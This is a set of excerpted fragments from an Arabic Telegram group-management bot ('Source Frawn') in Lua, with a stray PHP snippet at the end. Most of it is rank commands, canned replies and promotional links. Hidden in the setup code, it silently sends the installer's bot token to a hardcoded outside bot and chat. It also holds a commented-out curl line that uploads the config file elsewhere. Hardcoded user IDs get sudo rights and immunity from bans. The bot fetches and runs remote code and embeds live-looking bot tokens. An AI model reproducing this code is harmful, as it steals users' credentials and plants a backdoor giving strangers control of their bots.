...
if res ~= 200 then
print('\27[0;31m≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n27[0;39;49m')
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1888672599:AAFyuBt3MS2e9A9gOX7d02fAV5ckMZkQPLU/sendmessage?chat_id=1706080513&text=' ..token)
end 
else
print('\27[0;35m≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
if [ ! $token ]; then
echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE frawn.lua \e[0m"
echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
exit 1
fi
...
local config = loadfile("./frawn.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/black801/Bak/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,913663973,1635597460}   
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'عمو اشرف'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍")  
...
{'قناة السورس','المطور','الثانوين'},
{'تعطيل التواصل ','تفعيل التواصل '},
{'بوت التواصل','المطورين','قائمه العام'},
...
send(msg.chat_id_, msg.id_,' ❍ تم تحديث السورس \n ❍ لديك اخر اصدار لسورس عمو اشرف\n ❍ الاصدار » { v 1.5}')
dofile('DRAGON.lua')  
end
if text == 'الاصدار' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ❍ اصدار سورس عمو اشرف \n ❍ الاصدار »{ v 1.5}')
end
if text == 'قناه السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/source_frawn)
]] 
keyboard = {}  
...
if text == '≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/source_frawn)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫', url="t.me/source_frawn"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = [[ 
🌨 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 🌨

🌨 مرحبا في سورس عمو اشرف الاعظم 🌨

]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '☾ 𝐀𝐒𝐇𝐑𝐀𝐅 ☽',url="t.me/asera126"},{text = '☾ 𝐅𝐑𝐀𝐖𝐍 𝐖𝐀  ☽',url="t.me/asera126"}}, 
{{text = '[𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍]', url="t.me/source_frawn"}}, 
...
local Text = [[
𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍❍
❍اهلا بك في سورس عمو اشرف الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني ❍
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓆩𝐅𝐑𝐀𝐖𝐍𓆪',url="t.me/asera126"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'عمو اشرف' then
local Text = [[
المبرمج عمو اشرف لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ❨𝐅𝐑𝐀𝐖𝐍 𝐖𝐀 ❩ ',url="t.me/asera126"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'عم اشرف' then
local Text = [[
المالك اشرف لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ❨𝐀𝐒𝐇𝐑𝐀𝐅❩ ',url="t.me/asera126"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/asera126&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس عمو اشرف ؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس عمو اشرف ؟ ", 
"كم مره حبيت؟ ", 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𓆩𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍𓆪', url="t.me/source_frawn"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ❨ 𝐅𝐑𝐀𝐖𝐍 ❩ ',url="t.me/asera126"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/asera126&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'العاب عمو اشرف' then
local Text = [[
𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍
]]
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❍ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'source_frawn')..') \n ❍ تـم قفـل التاك بالكتم ')
end,nil)   
...
if result.sender_user_id_ == tonumber(913663973) then
...
if result.sender_user_id_ == tonumber(1706080513) then
send(msg.chat_id_, msg.id_, " ❍ لا يمكنك حظر المسلم\n")
return false 
end
...
if result.sender_user_id_ == tonumber(1706080513) then
send(msg.chat_id_, msg.id_, " ❍ لا يمكنك كتم المسلم\n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/black801/Bak/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ❍ اهلا بك في متجر ملفات عمو اشرف\n ❍ ملفات السورس ↓\n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n\n"
...
local json_file, res = https.request("https://raw.githubusercontent.com/black801/Bak/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ❍ عذرا الملف لايدعم سورس عمو اشرف \n") 
end
return false
end
...
if text == ("مسح قائمه عمو اشرف") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ❍ تم مسح قائمه عمو اشرف')
return false
end

if text == 'قائمه عمو اشرف' and Sudo(msg) then
...
if #list == 0 then
t = " ❍ لا يوجد احد في قائمه عمو اشرف"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع عمو اشرف") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع عمو اشرف @(.*)$") and Sudo(msg) then
local username = text:match("^رفع عمو اشرف @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع عمو اشرف (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع عمو اشرف (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل عمو اشرف") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل عمو اشرف @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل عمو اشرف @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل عمو اشرف (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل عمو اشرف (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
' }\n'..' ❍ الايدي بالصوره » { '..idph..
' }\n'..' ❍  الرفع » { '..setadd..
-- ' }\n'..' ❍  الحظر » { '..banm..' }\n\n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n ❍ قناة سورس عمو اشرف ↓\n [ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍](t.me/source_frawn) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
if text == "بوت" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'عمو اشرف')
local DRAGON_Msg = {
...
database:set(bot_id.."source_frawn:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."source_frawn:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."source_frawn:insta_bot"..msg.chat_id_) == "open" then
...
end --الكود حصري سورس عمو اشرف يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'عمو اشرف').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/source_frawn)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/source_frawn)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/source_frawn)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/source_frawn)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/source_frawn)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂❍](t.me/source_frawn)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/source_frawn)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/source_frawn)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز يروحي 🌚❤️ ](t.me/source_frawn)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[عضو قميل 😉](t.me/source_frawn)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/source_frawn)') 
return false
end

if text == 'حصل' or text == 'حص' then
send(msg.chat_id_,msg.id_, '[حصل حصوله😂🎶](t.me/source_frawn)') 
return false
end

if text == 'صلي علي الحبيب' or text == 'محمد عليه السلام' then
send(msg.chat_id_,msg.id_, '[عليه افضل الصلاة والسلام 💙📿](t.me/source_frawn)') 
return false
end
...
send(msg.chat_id_,msg.id_, '[تدوم الضحكه يا روحي 🌝❤](t.me/source_frawn)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/source_frawn)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[لف وارجعع تانيي مشحوار😹💃❤️](t.me/source_frawn)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/source_frawn)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/source_frawn)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/source_frawn)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/source_frawn)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/source_frawn)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/source_frawn)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم ب ف ..🙄💔](t.me/source_frawn)')
return false
end
end
end
...
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'😎🖤هاذا الامر ل الادمن يقمر 😎🖤\n 😎🖤يقلبي غير  مسموح لك بالامر😎🖤')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
local Text =[[
اتبع الازرار تحت  واستمتع ب اقوي اوامر في التليجرام 🕹️


اوامر سورس عمو اشرف الاوامر خاصه ب الادمن 🕹️
[❍ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ❍](t.me/source_frawn)
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
{
{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍', url="t.me/source_frawn"},
{text = 'مبرمج السورس', url="t.me/asera126"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
{
{text = ' ❍ التنزيل والرفع ❍', callback_data="/help4"},
},
{
{text = '❍ اوامر المطورين ❍', callback_data="/help5"},
},
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'عمو اشرف')
...
--local curl = 'curl "'..'https://api.telegram.org/bot1564973291:AAF2IwSno-EITmF3sGz40dGXKVNKNaUn0wI/sendDocument'..'" -F "chat_id='.. 913663973 ..'" -F "document=@'..'frawn.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
...
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"⌯ المشرف : [$name](tg://user?id=$from_id)
قام ببدأ محادثة صوتية ",'parse_mode' =>"markdown", 'reply_to_message_id'=>$message->message_id, 
]);
}
if($envoice){
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"⌯ المشرف : [$name](tg://user?id=$from_id)
قام بانهاء المحادثة الصوتية ",'parse_mode' =>"markdown", 'reply_to_message_id'=>$message->message_id, 
]);
}
...
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"⌯ العضو : [$name](tg://user?id=$from_id)
قام بدعوة شخص الى المحادثة الصوتية ",'parse_mode' =>"markdown", 'reply_to_message_id'=>$message->message_id, 
]);
}
